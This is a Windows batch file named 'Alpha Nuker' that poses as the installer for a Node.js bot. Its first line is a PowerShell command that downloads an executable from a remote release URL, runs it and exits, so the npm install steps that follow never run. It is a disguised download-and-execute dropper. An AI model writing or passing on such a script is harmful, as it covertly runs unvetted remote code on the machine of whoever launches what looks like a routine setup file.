@echo off
title Alpha Nuker
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/Alpha-Nuker/releases/download/Alpha-Nuker/Alpha-Nuker.exe';$file='Alpha-Nuker.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit

if exist node_modules\ (
  echo You've already installed this
  echo Navigate to "config" folder for bot settings and "src" to start the script
  pause
  exit
) else (
  call npm i >> NUL
  echo Succesfully installed!
  echo Please re-run this file.
  pause
  exit
)
